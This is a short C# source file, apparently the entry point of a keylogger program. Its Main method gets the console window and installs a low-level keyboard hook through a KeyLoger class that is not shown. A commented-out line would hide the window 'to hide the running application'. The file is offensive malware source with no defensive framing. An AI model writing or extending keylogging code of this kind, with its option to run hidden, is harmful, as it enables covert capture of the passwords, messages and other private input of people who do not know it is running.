namespace keyLoger
{
    class Program
    {
        const int SW_HIDE = 0;
        static void Main(string[] args)
        {
            var handle = KeyLoger.GetConsoleWindow();
           // KeyLoger.ShowWindow(handle, SW_HIDE);  // to hide the running application
            KeyLoger.IntializeLL_KEYBOARDHook();
        }
    }
}
